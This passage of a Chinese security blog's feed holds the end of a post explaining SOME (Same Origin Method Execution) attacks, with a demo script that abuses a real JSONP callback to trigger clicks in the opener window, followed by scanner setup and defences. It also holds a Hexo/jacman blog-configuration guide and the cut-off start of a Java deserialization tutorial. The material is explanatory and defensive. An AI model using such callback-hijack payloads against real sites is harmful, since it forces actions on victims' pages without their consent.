href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到，我这里只是为了方便大家理解，这个页面没有跳转操作，而SOME攻击的利用必须要一个跳转，跳转到目标域下才能完成利用。这里test.php打开了test2.html，test2.html的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://login.sina.com.cn/sso/logout.php?callback=window.opener.document.body.firstElementChild.click&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>只是作为理解用，这个接口在实际利用中并没有啥用。可以看到，回调中调用了父窗口的部件的点击操作。<br>然后，打开本地url，我的是<a href="http://127.0.0.1/jsonp/example/test.php，就会看到" target="_blank" rel="noopener">http://127.0.0.1/jsonp/example/test.php，就会看到</a><br><img src="/2017/12/21/SOME攻击/微博.png" alt="image"></p><h3 id="扫描工具使用"><a href="#扫描工具使用" class="headerlink" title="扫描工具使用"></a>扫描工具使用</h3><ol><li>装上burp，打开<a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener">这个</a>。</li><li>安装Maven：<br> 1.下载Maven的安装包，下载链接：<a href="http://maven.apache.org/download.cgi；" target="_blank" rel="noopener">http://maven.apache.org/download.cgi；</a><br> 2.下载后的文件为apache-maven-3.2.5-bin.zip 压缩包，将其解压到一个固定的文件夹。我的是解压到 C:\tools 目录下，更新Maven时只需要下载新的Maven包，解压到此目录并按照第三步修改环境变量即可。<br> 3.修改环境变量。打开系统属性面板（在桌面上右击”我的电脑” -&gt;”属性”-&gt;”高级系统设置”），然后点击”环境变量” -&gt;”新建”-&gt;输入”M2_HOME”和Maven解压后的根目录路径（我解压到C:\tools下所以完整的路径就是C:\tools\apache-maven-3.2.5），然后点击确定，再然后找到名为Path的系统变量，单击选中后点击”编辑”，将 %M2_HOME%\bin; 添加到变量值的开头（注意最后的分号也是要添加的）。<br> 4.验证是否安装成功。点击windows左下角的”开始”，在搜索框中输入cmd，然后回车就可以打开windows的命令提示符窗口，然后输入 echo %M2_HOME% 命令查看设置的环境变量，输入mvn -v 查看maven的版本<br>3.按官方git说明安装生成jar文件，mvn compile &amp;&amp; mvn package，从burp加载生成的jar包，即可对网站被动扫描<br><img src="/2017/12/21/SOME攻击/SOME扫描.png" alt="image"></li></ol><h3 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h3><pre><code>使用固定的回调值，而不是外部化回调控制白名单方法 -- 设置一个白名单，列出并匹配给定的回调参数值。这将强制执行并验证只有合法的回调函数可以执行。跨域消息传递 - 使用postMessage通知事件并与跨域进行交互，作为执行javascript回调的替代方法（如果适用）。</code></pre><p>参考链接：</p><pre><code>http://www.benhayak.com/2015/06/same-origin-method-execution-some.htmlhttp://www.mottoin.com/91299.htmlhttp://blog.safedog.cn/?p=13https://www.someattack.com/Playground/https://github.com/linkedin/sometime</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SOME攻击" scheme="https://michaelwayneliu.github.io/tags/SOME%E6%94%BB%E5%87%BB/"/>
    
      <category term="XSS" scheme="https://michaelwayneliu.github.io/tags/XSS/"/>
    
      <category term="JSONP" scheme="https://michaelwayneliu.github.io/tags/JSONP/"/>
    
  </entry>
  
  <entry>
    <title>博客迁移及jacman主题配置</title>
    <link href="https://michaelwayneliu.github.io/2017/12/21/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%8F%8Ajacman%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://michaelwayneliu.github.io/2017/12/21/博客迁移及jacman主题配置/</id>
    <published>2017-12-21T11:31:19.000Z</published>
    <updated>2017-12-21T11:37:40.199Z</updated>
    
    <content type="html"><![CDATA[<p>博客迁移及jacman主题配置的一些技巧<br><a id="more"></a></p><h3 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h3><p>针对从一个电脑迁移到另外一个情况</p><ol><li>下载git，Node.js安装，嫌弃麻烦配置公钥登录，打开git bash，输入：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure><p>邮箱换成自己github的</p><ol><li>登陆GitHub，打开「Settings」-&gt;「SSH and GPG keys」，然后点击「new SSH key」，填上任意Title，在Key文本框里粘贴公钥id_rsa.pub文件的内容，也就是以公钥来登录</li><li>打开git bash，输入 npm install hexo-cli -g，安装hexo</li><li>解释一下：</li></ol><pre><code>node_modules：是依赖包public：存放的是生成的页面scaffolds：命令生成文章等的模板source：用命令创建的各种文章themes：主题_config.yml：整个博客的配置db.json：source解析所得到的package.json：项目所需模块项目的配置信息，说明使用哪些包.gitignore ： 限定在提交的时候哪些文件可以忽略.git ： </code></pre><p>其中，必须拷贝的文件有_config.yml，theme/，source/，scaffolds/，package.json，.gitignore<br>，.git/，node_modules/，public/，.deploy_git/，db.json文件需要删除</p><ol><li>在git bash中切换目录到新拷贝的文件夹里，使用 npm install 命令，进行模块安装。不要用hexo init整体初始化。</li><li>安装npm install hexo-deployer-git –save使用hexo d</li><li>安装npm install hexo-generator-feed –save建立RSS订阅</li><li>建立站点地图</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save </span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><h3 id="jacman配置"><a href="#jacman配置" class="headerlink" title="jacman配置"></a>jacman配置</h3><h4 id="安装hexo-asset-image的插件来处理图片"><a href="#安装hexo-asset-image的插件来处理图片" class="headerlink" title="安装hexo-asset-image的插件来处理图片"></a>安装hexo-asset-image的插件来处理图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>确认_config.yml 中有 post_asset_folder:true，设置post_asset_folder为true参数后，在建立文件时，Hexo<br>会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。结构如下：</p><pre><code>本地图片测试├── apppicker.jpg├── logo.jpg└── rules.jpg</code></pre><p>本地图片测试.md<br>这样的目录结构（目录名和文章名一致），只要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](本地图片测试/logo.jpg)</span><br></pre></td></tr></table></figure><p>就可以插入图片。其中[]里面不写文字则没有图片标题。</p><h4 id="添加总pv计数和总uv计数"><a href="#添加总pv计数和总uv计数" class="headerlink" title="添加总pv计数和总uv计数"></a>添加总pv计数和总uv计数</h4><p>在themes/你的主题/layout/_partial/footer.ejs中最后面添加脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在上面footer.ejs文件最后添加这两个计数脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;</span><br><span class="line">      Total visits: &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;</span><br><span class="line">      You are Visiter No.&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure></p><h4 id="添加文章访问计数"><a href="#添加文章访问计数" class="headerlink" title="添加文章访问计数"></a>添加文章访问计数</h4><p>这里我添加到标题右下方，正文上面的地方。在themes/jacman/layout/_partial/post/header.ejs中<br>class=”article-time”&gt; 标签里面添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">    总阅读&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure><h4 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h4><p>直接在根目录下创建自己的404.html或者404.md就可以<br>推荐使用腾讯公益<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; </span><br><span class="line">   src=&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span><br><span class="line">   charset=&quot;utf-8&quot; </span><br><span class="line">   homePageUrl=&quot;http://yoursite.com/yourPage.html&quot; </span><br><span class="line">   homePageName=&quot;回到我的主页&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="打赏功能"><a href="#打赏功能" class="headerlink" title="打赏功能"></a>打赏功能</h4><p>在themes\jacman_config.yml文件中添加如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">donate:</span><br><span class="line">  enable: true</span><br><span class="line">  text: 打赏我的人，运气都不会太差~</span><br><span class="line">  wechat: http://ac-fmwkcchq.clouddn.com/079ce0e3beced7de32fa.jpeg</span><br><span class="line">  alipay: http://ac-fmwkcchq.clouddn.com/ccfe5d160b2b94b6e4c0.jpeg</span><br><span class="line">  web: true</span><br></pre></td></tr></table></figure><p>我们想要将打赏功能嵌入到每一篇博客当中，所以我们需要改动文章显示的HTML模板。<br>找到themes\jacman\layout_partial\post\article.ejs<br>这就是文章的HTML模板文件，在<div class="article-content">…</div>的下面，&lt;%- partial(‘footer’) %&gt;的上面插入如下HTML代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.donate) &#123; %&gt;</span><br><span class="line">    &lt;!-- css --&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        .center &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        .hidden &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line">        .donate_bar a.btn_donate&#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            width: 82px;</span><br><span class="line">            height: 82px;</span><br><span class="line">            background: url(&quot;http://7xsl28.com1.z0.glb.clouddn.com/btn_reward.gif&quot;) no-repeat;</span><br><span class="line">            _background: url(&quot;http://7xsl28.com1.z0.glb.clouddn.com/btn_reward.gif&quot;) no-repeat;</span><br><span class="line"></span><br><span class="line">            &lt;!-- http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif</span><br><span class="line">                 因为本 hexo 生成的博客所用的 theme 的 a:hover 带动画效果，</span><br><span class="line">                 为了在让打赏按钮显示效果正常 而 添加了以下几行 css，</span><br><span class="line">                 嵌入其它博客时不一定要它们。 --&gt;</span><br><span class="line">            -webkit-transition: background 0s;</span><br><span class="line">            -moz-transition: background 0s;</span><br><span class="line">            -o-transition: background 0s;</span><br><span class="line">            -ms-transition: background 0s;</span><br><span class="line">            transition: background 0s;</span><br><span class="line">            &lt;!-- /让打赏按钮的效果显示正常 而 添加的几行 css 到此结束 --&gt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .donate_bar a.btn_donate:hover&#123; background-position: 0px -82px;&#125;</span><br><span class="line">        .donate_bar .donate_txt &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            color: #9d9d9d;</span><br><span class="line">            font: 14px/2 &quot;Microsoft Yahei&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        .bold&#123; font-weight: bold; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;!-- /css --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Donate Module --&gt;</span><br><span class="line">    &lt;div id=&quot;donate_module&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- btn_donate &amp; tips --&gt;</span><br><span class="line">    &lt;div id=&quot;donate_board&quot; class=&quot;donate_bar center&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        ------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;a id=&quot;btn_donate&quot; class=&quot;btn_donate&quot; target=&quot;_self&quot; href=&quot;javascript:;&quot; title=&quot;Donate 打赏&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;span class=&quot;donate_txt&quot;&gt;</span><br><span class="line">            &lt;%= theme.donate.text %&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- /btn_donate &amp; tips --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- donate guide --&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;div id=&quot;donate_guide&quot; class=&quot;donate_bar center hidden&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        ------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;% if(theme.donate.web) &#123; %&gt;</span><br><span class="line">        &lt;div width=&quot;100%&quot; align=&quot;center&quot;&gt;&lt;div name=&quot;dashmain&quot; id=&quot;dash-main-id-87895f&quot; class=&quot;dash-main-3 87895f-0.99&quot;&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://www.dashangcloud.com/static/ds.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">        &lt;a href=&quot;&lt;%= theme.donate.wechat %&gt;&quot; title=&quot;用微信扫一扫哦~&quot; class=&quot;fancybox&quot; rel=&quot;article0&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;&lt;%= theme.donate.wechat %&gt;&quot; title=&quot;微信打赏 Donate&quot; height=&quot;190px&quot; width=&quot;auto&quot;/&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">        </span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">        &lt;a href=&quot;&lt;%= theme.donate.alipay %&gt;&quot; title=&quot;用支付宝扫一扫即可~&quot; class=&quot;fancybox&quot; rel=&quot;article0&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;&lt;%= theme.donate.alipay %&gt;&quot; title=&quot;支付宝打赏 Donate&quot; height=&quot;190px&quot; width=&quot;auto&quot;/&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;span class=&quot;donate_txt&quot;&gt;</span><br><span class="line">            &lt;%= theme.donate.text %&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- /donate guide --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- donate script --&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        document.getElementById(&apos;btn_donate&apos;).onclick = function() &#123;</span><br><span class="line">            $(&apos;#donate_board&apos;).addClass(&apos;hidden&apos;);</span><br><span class="line">        $(&apos;#donate_guide&apos;).removeClass(&apos;hidden&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function donate_on_web()&#123;</span><br><span class="line">            $(&apos;#donate&apos;).submit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var original_window_onload = window.onload;</span><br><span class="line">        window.onload = function () &#123;</span><br><span class="line">            if (original_window_onload) &#123;</span><br><span class="line">                original_window_onload();</span><br><span class="line">            &#125;</span><br><span class="line">            document.getElementById(&apos;donate_board_wdg&apos;).className = &apos;hidden&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;!-- /donate script --&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!-- /Donate Module --&gt;</span><br><span class="line">   &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><p>多说，网易云跟帖等挂掉，留给我为数不多的选择有gitment、来必力、disqus。</p><ul><li>disqus评论需要翻墙，在theme目录下的_config.yml填写disqus_shortname，就是disqus 的用户名，登录<a href="https://disqus.com/" target="_blank" rel="noopener">disqus</a>，注册，get started –&gt; I want to install Disqus on my site –&gt; Website Name就是disqus_shortname。</li><li>来必力很好用，韩国的，国内可用，支持图片，可以数据统计，邮件通知应有尽有，登录<a href="https://livere.com/" target="_blank" rel="noopener">livere</a>，注册，头像 –&gt; 管理页面 –&gt; 生成JS代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id=&quot;lv-container&quot; data-id=&quot;city&quot; data-uid=&quot;xxxxxxx&quot;&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e = d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower === &apos;function&apos;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j = d.createElement(s);</span><br><span class="line">       j.src = &apos;https://cdn-city.livere.com/js/embed.dist.js&apos;;</span><br><span class="line">       j.async = true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &apos;script&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;noscript&gt;为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure><p>在themes\jacman\layout_partial\post\article.ejs中    <strong>&lt;%- partial(‘pagination’) %&gt;</strong> 和 <strong>&lt;%- partial(‘comment’) %&gt;</strong> 中间暴力插入JS代码即可。如果有多个评论插件，可以在themes\jacman\layout_partial\post\comment.ejs中类似的加入判断条件。</p><ul><li>Gitment<br>还没试，参考<a href="http://xintq.net/2017/05/02/use-gitment-for-comment/" target="_blank" rel="noopener">这个</a>，将来如果来必力挂掉再说吧。</li></ul><p>参考链接：</p><pre><code>http://wuchong.me/blog/2014/11/20/how-to-use-jacman/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客迁移及jacman主题配置的一些技巧&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="博客" scheme="https://michaelwayneliu.github.io/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客迁移" scheme="https://michaelwayneliu.github.io/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
    
      <category term="jacman主题配置" scheme="https://michaelwayneliu.github.io/tags/jacman%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://michaelwayneliu.github.io/2017/03/06/java/"/>
    <id>https://michaelwayneliu.github.io/2017/03/06/java/</id>
    <published>2017-03-06T13:54:47.000Z</published>
    <updated>2017-03-06T13:56:43.252Z</updated>
    
    <content type="html"><![CDATA[<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。<br><a id="more"></a></p><h4 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h4><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。大多数编程语言都提供内置的方法来实现这两个过程。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。<br><img src="http://p1.bqimg.com/567571/2224a823829b8146.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        String name = <span class="string">"bob"</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(name);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        String nameFromDisk = (String)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(nameFromDisk);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob</span><br><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ xxd name.ser</span><br><span class="line">0000000: aced 0005 7400 0362 6f62 ....t..bob</span><br></pre></td></tr></table></figure><p>可以看到”name.ser”里的字符串可以被人眼识别，但其他信息已经被转换为二进制数据了。注意文件开头的“<strong>aced 0005</strong>”，这表示一切序列化后的java对象开头的两个字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"bob"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span 